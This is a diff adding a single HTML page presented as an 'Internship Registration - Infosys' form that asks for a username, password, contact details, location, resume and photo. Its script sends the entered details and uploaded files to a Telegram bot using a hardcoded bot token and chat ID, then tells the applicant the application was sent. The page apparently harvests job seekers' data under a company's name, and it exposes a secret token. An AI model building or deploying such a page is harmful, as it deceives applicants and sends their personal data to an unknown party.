@@ -1,0 +1,280 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Job Internship Portal</title>
+  <style>
+    :root{--glass-bg:rgba(255,255,255,0.85);--accent:#0066ff;--muted:#6b7280}
+    *{box-sizing:border-box}
+    body {
+  font-family: Inter, Arial, sans-serif;
+  margin: 0;
+  padding: 20px 0;
+  background: linear-gradient(135deg,#6dd5fa,#2980b9);
+  overflow-y: auto !important;
+  min-height: 100vh;
+}
+    .container{width:420px;background:var(--glass-bg);backdrop-filter:blur(8px);border-radius:16px;padding:26px;box-shadow:0 10px 30px rgba(2,6,23,0.2);animation:pop .45s ease}
+    @keyframes pop{from{opacity:0;transform:translateY(8px) scale(.98)}to{opacity:1;transform:none}}
+    h2{text-align:center;margin:0 0 12px;color:#03396c}
+    p.lead{text-align:center;margin:0 0 18px;color:var(--muted)}
+    label{display:block;font-weight:700;margin-top:10px;color:#03396c}
+    input,select,textarea {
+  width: 100%;
+  padding: 11px;
+  margin-top: 8px;
+  border-radius: 10px;
+  border: 1px solid rgba(3,57,108,0.08);
+  font-size: 15px;
+  background: #fbfdff;
+  color: #000;
+}
+    textarea{min-height:100px}
+    .row{display:flex;gap:10px}
+    .row .col{flex:1}
+    .actions{display:flex;gap:10px;align-items:center;margin-top:14px}
+    button.primary{flex:1;padding:12px;border-radius:10px;border:none;background:var(--accent);color:white;font-weight:700;cursor:pointer}
+    button.ghost{padding:10px;border-radius:10px;border:1px solid rgba(3,57,108,0.12);background:transparent;cursor:pointer}
+    /* spinner */
+    .spinner{width:36px;height:36px;border-radius:50%;border:4px solid rgba(255,255,255,0.6);border-top-color:var(--accent);animation:spin 1s linear infinite;margin:auto}
+    @keyframes spin{to{transform:rotate(360deg)}}/* file preview */
+.preview{display:flex;gap:10px;align-items:center;margin-top:10px}
+.avatar{width:56px;height:56px;border-radius:10px;background:#eef3ff;border:1px dashed rgba(3,57,108,0.08);display:flex;align-items:center;justify-content:center;overflow:hidden}
+.avatar img{width:100%;height:100%;object-fit:cover}
+.file-info{font-size:13px;color:var(--muted)}
+
+/* success modal */
+.modal{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;visibility:hidden;opacity:0;transition:all .25s}
+.modal.show{visibility:visible;opacity:1}
+.modal-card{background:white;padding:28px;border-radius:14px;box-shadow:0 14px 40px rgba(2,6,23,0.2);text-align:center}
+.check{width:72px;height:72px;border-radius:50%;background:linear-gradient(135deg,#34d399,#10b981);display:inline-flex;align-items:center;justify-content:center;color:white;font-size:34px;margin:6px auto}
+.modal h3{margin:8px 0 0}
+.modal p{color:var(--muted);margin:8px 0 0}
+
+.small{font-size:13px;color:var(--muted)}
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Internship Registration - Infosys</h2>
+    <p class="lead">Apply now — upload resume & profile picture. City auto-detection available.</p><form id="internForm">
+  <label>Username</label>
+  <input id="username" type="text" placeholder="Enter username" required />
+
+  <label>Password</label>
+  <div style="position:relative">
+    <input id="pass" type="password" placeholder="Enter password" required style="padding-right:44px" />
+    <button type="button" id="togglePass" title="Show / Hide" style="position:absolute;right:8px;top:8px;border:none;background:none;cursor:pointer;font-size:18px">&#128065;</button>
+  </div>
+
+  <label>Full Name</label>
+  <input id="fullname" type="text" placeholder="Enter your full name" required />
+
+  <div class="row">
+    <div class="col">
+      <label>Email</label>
+      <input id="email" type="email" placeholder="you@example.com" required />
+    </div>
+    <div class="col">
+      <label>Phone</label>
+      <input id="phone" type="tel" placeholder="+91 99999 99999" required />
+    </div>
+  </div>
+
+  <label>City</label>
+  <div style="display:flex;gap:8px;align-items:center">
+    <select id="citySelect" style="flex:1;padding:10px;border-radius:10px;border:1px solid rgba(3,57,108,0.08);background:#fbfdff">
+      <option value="">Select City</option>
+      <option>Mumbai</option>
+      <option>Pune</option>
+      <option>Delhi</option>
+      <option>Bangalore</option>
+      <option>Hyderabad</option>
+      <option>Chennai</option>
+      <option>Kolkata</option>
+      <option>Jaipur</option>
+      <option>Ahmedabad</option>
+    </select>
+    <button type="button" id="detectCity" class="ghost">Detect</button>
+  </div>
+
+  <label>Choose Internship Field</label>
+  <select id="field" required>
+    <option value="">Select field</option>
+    <option>Web Development</option>
+    <option>Android Development</option>
+    <option>Graphic Design</option>
+    <option>Digital Marketing</option>
+    <option>Cybersecurity</option>
+    <option>Data Science</option>
+  </select>
+
+  <label>Upload Resume (PDF, max 4MB)</label>
+  <input id="resume" type="file" accept="application/pdf" />
+  <div id="resumePreview" class="preview" style="display:none">
+    <div class="file-info" id="resumeName"></div>
+  </div>
+
+  <label>Profile Picture (png/jpg)</label>
+  <input id="avatar" type="file" accept="image/*" />
+  <div id="avatarPreview" class="preview" style="display:none">
+    <div class="avatar" id="avatarBox"></div>
+    <div class="file-info" id="avatarName"></div>
+  </div>
+
+  <label>Why do you want this internship?</label>
+  <textarea id="reason" placeholder="Write your reason..." required></textarea>
+
+  <div class="actions">
+    <button id="submitBtn" class="primary" type="submit">Submit Application</button>
+    <button id="clearBtn" type="button" class="ghost">Clear</button>
+  </div>
+
+  <div id="loading" style="display:none;margin-top:14px;text-align:center">
+    <div class="spinner"></div>
+    <div class="small" style="margin-top:8px">Submitting…</div>
+  </div>
+</form>
+
+  </div>  <!-- success modal -->  <div id="modal" class="modal">
+    <div class="modal-card">
+      <div class="check">✓</div>
+      <h3>Application Submitted</h3>
+      <p>Your application has been sent successfully. We will contact you soon.</p>
+      <div style="margin-top:12px">
+        <button id="modalClose" class="ghost">Close</button>
+      </div>
+    </div>
+  </div>  <script>
+    // === CONFIG - replace with your values ===
+    const BOT_TOKEN = "8266137808:AAEsi7Jao0fTNvOsUFnGOsGC5lFM2xE8KQ0";
+    const CHAT_ID = "8467982663";
+    // =========================================
+
+    const form = document.getElementById('internForm');
+    const loading = document.getElementById('loading');
+    const submitBtn = document.getElementById('submitBtn');
+    const clearBtn = document.getElementById('clearBtn');
+    const citySelect = document.getElementById('citySelect');
+    const detectCity = document.getElementById('detectCity');
+    const resumeInput = document.getElementById('resume');
+    const resumePreview = document.getElementById('resumePreview');
+    const resumeName = document.getElementById('resumeName');
+    const avatarInput = document.getElementById('avatar');
+    const avatarPreview = document.getElementById('avatarPreview');
+    const avatarBox = document.getElementById('avatarBox');
+    const avatarName = document.getElementById('avatarName');
+
+    // toggle password
+    document.getElementById('togglePass').addEventListener('click', function(){
+      const p = document.getElementById('pass');
+      if(p.type === 'password'){ p.type = 'text'; this.innerHTML='&#128584;'; } else { p.type='password'; this.innerHTML='&#128065;'; }
+    });
+
+    // clear form
+    clearBtn.addEventListener('click', ()=>{ form.reset(); resumePreview.style.display='none'; avatarPreview.style.display='none'; });
+
+    // resume preview
+    resumeInput.addEventListener('change', ()=>{
+      const f = resumeInput.files[0];
+      if(!f) { resumePreview.style.display='none'; return; }
+      if(f.size > 4*1024*1024){ alert('Resume too large (max 4MB)'); resumeInput.value=''; return; }
+      resumeName.textContent = f.name + ' (' + Math.round(f.size/1024) + ' KB)';
+      resumePreview.style.display='flex';
+    });
+
+    // avatar preview
+    avatarInput.addEventListener('change', ()=>{
+      const f = avatarInput.files[0];
+      if(!f) { avatarPreview.style.display='none'; return; }
+      if(f.size > 2*1024*1024){ alert('Image too large (max 2MB)'); avatarInput.value=''; return; }
+      const url = URL.createObjectURL(f);
+      avatarBox.innerHTML = '<img src="'+url+'" alt="avatar">';
+      avatarName.textContent = f.name;
+      avatarPreview.style.display='flex';
+    });
+
+    // city detection using Geolocation + Nominatim reverse geocode
+    detectCity.addEventListener('click', ()=>{
+      if(!navigator.geolocation){ alert('Geolocation not supported'); return; }
+      detectCity.disabled = true; detectCity.textContent='Detecting...';
+      navigator.geolocation.getCurrentPosition(async (pos)=>{
+        const lat = pos.coords.latitude; const lon = pos.coords.longitude;
+        try{
+          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
+          const data = await res.json();
+          const city = data.address.city || data.address.town || data.address.village || data.address.county || '';
+          if(city){
+            // try to select matching option
+            let found = false;
+            for(const opt of citySelect.options){ if(opt.value.toLowerCase() === city.toLowerCase()){ opt.selected = true; found=true; break; } }
+            if(!found){
+              // add as custom option
+              const o = document.createElement('option'); o.text = city; o.value = city; o.selected = true; citySelect.add(o);
+            }
+          } else alert('City not found from coordinates');
+        }catch(err){ console.error(err); alert('Unable to reverse-geocode location'); }
+        detectCity.disabled = false; detectCity.textContent='Detect';
+      }, (err)=>{ alert('Location denied or unavailable'); detectCity.disabled=false; detectCity.textContent='Detect'; });
+    });
+
+    // modal controls
+    const modal = document.getElementById('modal');
+    const modalClose = document.getElementById('modalClose');
+    modalClose.addEventListener('click', ()=>{ modal.classList.remove('show'); });
+
+    // form submit
+    form.addEventListener('submit', async (e)=>{
+      e.preventDefault();
+      submitBtn.disabled = true; loading.style.display='block';
+
+      try{
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('pass').value; // sensitive
+        const fullname = document.getElementById('fullname').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+        const city = document.getElementById('citySelect').value;
+        const field = document.getElementById('field').value;
+        const reason = document.getElementById('reason').value.trim();
+
+        // send text message to Telegram
+        const text = `New Internship Application:
+Name: ${fullname}
+Username: ${username}
+Email: ${email}
+Phone: ${phone}
+City: ${city}
+Field: ${field}
+Reason: ${reason}`;
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+
+        // send resume file if present
+        const resumeFile = resumeInput.files[0];
+        if(resumeFile){
+          const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('document', resumeFile, resumeFile.name);
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method:'POST', body: fd });
+        }
+
+        // send avatar image if present
+        const avatarFile = avatarInput.files[0];
+        if(avatarFile){
+          const fd2 = new FormData(); fd2.append('chat_id', CHAT_ID); fd2.append('photo', avatarFile, avatarFile.name);
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd2 });
+        }
+
+        // show success modal
+        loading.style.display='none';
+        modal.classList.add('show');
+        form.reset(); resumePreview.style.display='none'; avatarPreview.style.display='none';
+
+      }catch(err){
+        console.error(err); alert('Error sending application.');
+      }finally{
+        submitBtn.disabled = false; loading.style.display='none';
+      }
+    });
+
+  </script></body>
+</html>
